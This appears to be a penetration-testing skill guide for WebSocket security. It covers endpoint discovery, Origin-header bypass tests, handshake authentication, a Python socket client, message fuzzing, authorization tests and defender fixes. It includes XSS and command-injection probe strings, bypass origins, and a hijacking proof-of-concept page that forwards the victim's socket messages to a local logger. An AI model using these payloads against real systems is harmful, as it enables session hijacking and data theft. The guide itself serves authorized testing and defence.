---
name: websocket-security
description: "Use when an application uses WebSockets (ws:// or wss://) on an authorized engagement. Covers finding WebSocket endpoints in JavaScript and proxy history, testing Origin header validation for cross-site WebSocket hijacking (CSWSH), probing authentication and session handling during the HTTP Upgrade handshake, fuzzing message frames for injection and stored XSS delivered through socket messages, and exploiting missing origin checks with a proof of concept page. Use when the app has live chat, notifications, trading tickers, dashboards, or any real-time feature, or when Burp Suite 2026.2 shows Upgrade: websocket traffic."
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-xss, auth-attacks, webapp-pentest-methodology]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---
WebSockets give the browser a full-duplex channel to the server after a
single HTTP Upgrade handshake, and that channel often carries the same
privileges as a logged-in session while receiving far less security review
than normal HTTP endpoints. This skill covers the full authorized methodology:
discovering WebSocket endpoints, testing Origin validation during the
handshake, probing how authentication and CSRF protection apply (or fail to
apply) to socket traffic, fuzzing message frames for injection flaws, and
proving cross-site WebSocket hijacking. All testing targets systems you have
written permission to test.

## Quick Workflow

1. Find every WebSocket endpoint: search JavaScript for `new WebSocket`,
   check Burp Suite proxy history for `Upgrade: websocket` requests, and
   watch the browser devtools Network tab filtered by WS.
2. Replay the handshake with curl and vary the `Origin` header to test
   origin validation before touching any message logic.
3. Test how the handshake authenticates: cookies, tokens in the URL, custom
   headers, or nothing at all.
4. Connect with a Python script and exercise each message type the client
   sends: chat text, commands, JSON actions.
5. Fuzz message fields for injection: XSS payloads, JSON structure breaks,
   oversized frames, and binary frames.
6. Test cross-site WebSocket hijacking with a local HTML proof of concept
   page when origin validation is missing.
7. Check for authorization flaws: can one user's socket read or act on
   another user's data, rooms, or channels.
8. Record every handshake request and response, every message pair, and the
   exact origin policy observed, for the report.

## 1. Discovering WebSocket endpoints

WebSocket URLs hide in client JavaScript, in mobile app traffic, and in
proxy history. Collect them all before testing.

```bash
# Search fetched JavaScript for WebSocket constructors (run from a saved copy)
grep -rhoE "new WebSocket\(['\"][^'\"]+['\"]" /tmp/js/ | sort -u

# Common patterns also include wss:// assigned to variables
grep -rhoE "wss?://[a-zA-Z0-9./:_?=-]+" /tmp/js/*.js | sort -u | head -30
```

```bash
# In Burp Suite 2026.2, filter proxy history for the Upgrade header,
# or reproduce the handshake filter from the command line against a log:
grep -i "upgrade: websocket" /tmp/burp-history-export.txt | head -10
```

Open the application in a browser with devtools, filter the Network tab by
WS, and click through every real-time feature (chat, notifications, live
search). Each socket that opens is an endpoint to test. Note the full URL,
the subprotocol if any (`Sec-WebSocket-Protocol`), and whether the URL
carries a token.

## 2. Testing Origin validation on the handshake

The `Origin` header is the main CSRF-style defense for WebSockets, because
browsers send it on the handshake but same-origin policy does not block the
handshake itself. Replay the handshake with different origins and watch for
HTTP 101 (accepted) versus 403 (rejected).

```bash
# Baseline: legitimate origin, expect HTTP 101 Switching Protocols
curl -si -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://target.example" \
  https://target.example/socket | head -12
```

```bash
# Evil origin: a 101 here means missing or broken origin validation
curl -si -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.example" \
  https://target.example/socket | head -12

# Null origin (sandboxed iframes, redirects, and data: URLs send this)
curl -si -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: null" \
  https://target.example/socket | head -12

# No Origin header at all (non-browser clients omit it)
curl -si -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  https://target.example/socket | head -12
```

Also try origin bypass variants when a check seems present: trailing dot
(`https://target.example.`), subdomain tricks (`https://target.example.evil.example`),
and scheme confusion (`http://target.example`). A check that compares with
`startsWith` or a loose regex falls to these.

## 3. Authentication and session handling

Determine what the server trusts during the handshake. Send the handshake
with and without cookies, and look for tokens embedded in the WebSocket URL.

```bash
# Handshake WITHOUT cookies: does the server still upgrade?
curl -si -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://target.example" \
  https://target.example/socket | head -8

# Handshake with a session cookie copied from the browser
curl -si -N -b "session=STOLEN_TEST_SESSION" \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://target.example" \
  https://target.example/socket | head -8
```

Key questions to answer: does the URL contain a token like
`wss://target.example/socket?token=abc` (leaks in logs and browser
history), does the server accept the handshake with no session at all,
and does it re-check authorization per message or only once at connect
time. A socket that upgrades anonymously but later accepts privileged
commands is a full authentication bypass.

## 4. Connecting and exercising messages with Python

Use a stdlib-only client so the test runs anywhere. This script performs
the handshake, sends masked text frames (required for client to server),
and prints server frames.

```python
#!/usr/bin/env python3
"""Minimal stdlib WebSocket client for authorized testing."""
import socket, ssl, base64, hashlib, os, struct

HOST = "target.example"
PORT = 443
PATH = "/socket"
ORIGIN = "https://target.example"
COOKIE = "session=YOUR_TEST_SESSION"

key = base64.b64encode(os.urandom(16)).decode()
req = (
    f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\n"
    "Upgrade: websocket\r\nConnection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
    f"Origin: {ORIGIN}\r\nCookie: {COOKIE}\r\n\r\n"
)
s = socket.create_connection((HOST, PORT), timeout=10)
s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
s.sendall(req.encode())
resp = s.recv(4096).decode(errors="replace")
print(resp.split("\r\n\r\n")[0])
assert "101" in resp.splitlines()[0], "handshake rejected"

def send_text(msg):
    data = msg.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    hdr = bytes([0x81, 0x80 | len(data)]) + mask  # FIN+text, masked
    s.sendall(hdr + masked)

def recv_text():
    h = s.recv(2)
    ln = h[1] & 0x7F
    if ln == 126:
        ln = struct.unpack(">H", s.recv(2))[0]
    return s.recv(ln).decode(errors="replace")

# Exercise the message types the real client sends
send_text('{"type":"join","room":"lobby"}')
print("server:", recv_text())
send_text('{"type":"msg","room":"lobby","text":"hello from test"}')
print("server:", recv_text())
```

Capture the real client's messages first (Burp WebSocket history or
devtools WS frames), then replay and mutate them with this script. Change
field values, add unexpected fields, and send commands the UI never sends,
such as `{"type":"admin"}` or `{"type":"msg","room":"admin-only"}`.

## 5. Message-level injection

Every string the server echoes back to any client is a stored XSS
candidate, and every string the server parses is an injection candidate.

```bash
# XSS probe through the chat message (watch other connected clients,
# including a second browser session, for execution)
# Send via the Python client:
# {"type":"msg","room":"lobby","text":"<img src=x onerror=alert(1)>"}
```

Test these systematically:

- HTML and JavaScript in chat text, usernames, status messages, and
  filenames: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`.
- JSON structure breaks: send a string where a number is expected,
  deeply nested objects, and duplicate keys.
- Command injection style probes where the server might shell out:
  `$(id)`, backticks, and `;` in fields like filenames or search terms.
- Oversized frames: a 10 MB text message tests for memory exhaustion
  handling (keep this gentle and inside the agreed test window).
- Binary frames: send opcode 0x2 with random bytes and watch for crashes
  or verbose errors that leak stack traces.

If the server broadcasts your input to other users, you have stored XSS
delivered over WebSockets, which most scanners miss entirely.

## 6. Cross-site WebSocket hijacking (CSWSH)

When origin validation is missing and the handshake relies on cookies,
any website the victim visits can open an authenticated socket as the
victim. Build the proof of concept locally, never hosted on a third-party
domain during the test.

```html
<!-- cswsh-poc.html: serve from http://127.0.0.1:8000 during the test -->
<script>
  // Victim must be logged in to target.example in this browser
  var ws = new WebSocket("wss://target.example/socket");
  ws.onopen = function () {
    ws.send(JSON.stringify({type: "msg", room: "lobby",
      text: "CSWSH proof: socket opened cross-origin"}));
  };
  ws.onmessage = function (e) {
    // Exfiltrate received messages to the test console
    console.log("LEAKED:", e.data);
    fetch("http://127.0.0.1:8000/log?d=" + encodeURIComponent(e.data));
  };
</script>
```

```bash
# Serve the PoC locally and open it in a browser logged in to the target
cd /tmp && python3 -m http.server 8000
```

If messages arrive in the attacker's console, the hijack works: the
attacker's page performs authenticated actions and reads private data
as the victim. Pair this with the origin tests from section 2 as evidence.

## 7. Authorization between users and channels

Open two sockets as two different test users and try to cross boundaries.

- Join a room or channel the second user was never invited to.
- Send a message with another user's `user_id` or `sender` field and see
  if the server trusts the client-supplied identity.
- Subscribe to another user's private notification channel, often named
  like `/user/123/notifications`, by guessing the ID.
- Replay a captured privileged message (for example a trade order or an
  admin broadcast) from the low-privilege socket.

Servers frequently check authorization at HTTP login but never again on
the socket. Document the exact message that crossed the boundary.

## Edge cases

- The endpoint only speaks `ws://` on an `https://` page: mixed content
  blocks the browser client, but curl and Python still connect, so test
  it anyway.
- Binary subprotocols (protobuf, msgpack): decode with the client's own
  schema before fuzzing; random bytes just get dropped.
- `Sec-WebSocket-Protocol` negotiation: the server may reject the
  handshake without the exact subprotocol the client sends, so copy it
  from devtools.
- Heartbeat ping/pong frames: the server may close idle sockets after 30
  to 60 seconds, so keep-alive in long fuzzing loops.
- Rate limiting or WAF on the HTTP handshake does not always apply to
  frames after upgrade; test message flooding separately and gently.
- Multiple tabs share one session cookie: CSWSH impact grows when the
  victim keeps the app open, which is the normal case for chat apps.
- Some servers validate Origin only when the header is present; the
  no-Origin curl test in section 2 catches that logic flaw.

## Escalation

- Origin check uses a regex like `*.target.example`: try
  `https://target.example.evil.example` and `https://eviltarget.example`.
- The check compares suffixes: `https://faketarget.example` may pass a
  naive `endswith("target.example")` test.
- Token in the WebSocket URL: steal it from browser history or logs in a
  lab setting, or show that any XSS on the site can read it from JS
  memory and open a socket.
- The server echoes the `Sec-WebSocket-Protocol` header: probe it for
  reflected XSS in error pages, a rare but real finding.
- No message authentication: tamper with sequence numbers or message IDs
  to test for replay acceptance, then escalate to the authorization
  tests in section 7.
- When the handshake needs a CSRF token, check whether the token is
  validated or only checked for presence; empty or static tokens are
  common.

## Detection and defender view

Defenders see WebSocket attacks as HTTP Upgrade requests with unusual or
missing `Origin` headers, a burst of 101 responses from one IP, message
rates far above human chat speed, and payload strings (`<svg`, `onerror`,
`${`) inside frame bodies logged by the application. The durable fixes
are strict Origin allowlisting on the handshake, authenticating the
handshake with the same session and CSRF rules as HTTP, never putting
tokens in the WebSocket URL, validating and authorizing every message
independently, and encoding all user content before broadcast. A WAF
rarely inspects frames after upgrade, so server-side validation is the
only reliable layer.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry point
  class for socket handshake flaws.
- CWE-1385 (Missing Origin Validation in WebSockets).
- CWE-20 (Improper Input Validation): message parsing flaws.
- CWE-79 (Cross-site Scripting): stored XSS delivered through messages.
- CWE-639 (Authorization Bypass Through User-Controlled Key): channel and
  identity confusion.
- OWASP WebSocket Security Cheat Sheet: origin validation, authentication,
  and message validation guidance.
- RFC 6455 (The WebSocket Protocol): handshake and framing rules.
- PortSwigger Web Security Academy: WebSocket labs, including CSWSH and
  message-based XSS.
